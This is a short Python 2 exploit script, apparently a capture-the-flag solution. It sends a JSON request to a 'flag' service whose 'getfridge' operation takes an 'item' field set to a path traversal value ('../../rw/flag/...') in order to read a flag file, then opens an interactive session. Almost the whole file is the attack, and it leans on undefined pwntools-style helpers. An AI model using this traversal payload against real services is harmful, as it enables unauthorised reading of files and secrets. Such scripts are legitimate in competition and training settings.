#!/usr/bin/env python2

import os
import struct
from time import sleep
import json

import socket

def recvuntil(s,m):
	b = ""
	while m not in b:
		b += s.recv(1)

s = start()

data = {}
data['service'] = "flag"
data['op'] = 'getfridge'
data['item'] = "../../rw/flag/807036773442"

s.sendline(json.dumps(data))

resp = s.readuntil("\n")
obj = json.loads(resp)

log.info("Got: {0}".format(resp))

s.interactive()